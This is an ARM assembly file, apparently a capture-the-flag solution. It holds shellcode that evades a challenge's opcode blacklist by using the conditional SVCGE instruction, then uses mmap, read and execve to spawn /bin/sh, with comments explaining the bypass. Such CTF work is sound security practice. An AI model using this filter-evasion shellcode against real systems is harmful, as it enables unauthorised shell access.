.syntax unified
.global main
.code 32
/*
 rough shellcode:
    void* ptr = mmap(0, PAGESIZE, PROT_READ|PROT_WRITE|PROT_EXEC,
    MAP_PRIVATE|MAP_ANON, 0, -1);
    read(0, ptr, sizeof("/bin/sh"))
    execve(ptr, NULL, NULL);

The main bypass to the assembly whitelist in the challenge is the use of the
cool fact that ARM supports (at least for some instructions) conditional
variants of those instructions. the challenge checks explicitly for the
existence of the `SVC` opcode (0xe8XXXXXX), catches some conditional variants of
it, but doesn't blacklist `SVCGE` - so we use that to do syscalls by setting
CCR properly before hand (the sub that always results in a positive result)

The second hack is that we need to bypass the fact that we cannot access the PC
and SP registers (at least not in a straight forward way I found empirically) -
and to use execve we need a memory address that contains "/bin/sh" - also, STR &
LDR opcodes are forbidden. So to bypass these two facts - I allocate memory
using the mmap syscall (to have some valid writable memory) and then write
"/bin/sh" to it using the read syscall that reads from stdin (to bypass the STR
opcode blacklist)
Enjoy :)
*/
_start:
    mov r7, 0xc0
    mov r0, 0
    mov r1, 4096
    mov r2, 07
    mov r3, 0x22
    mov r4, 1
    neg r4, r4
    mov r5, 0

    
    mov r10, 6
    mov r11, 5
    sub r10, r10, r11
	svcge 0               /* call mmap */

    mov r8, r0

    mov r0, 0
    mov r1, r8
    mov r2, 7

    
    mov r7, 3
    mov r10, 6
    mov r11, 5
    sub r10, r10, r11
	svcge 0               /* call read */


    mov r0, r8
    mov r1, 0
    mov r2, 0
    mov r7, 0xb
    mov r10, 6
    mov r11, 5
    sub r10, r10, r11
	svcge 0               /* call execve */
bin_sh:
    .string "abcd"
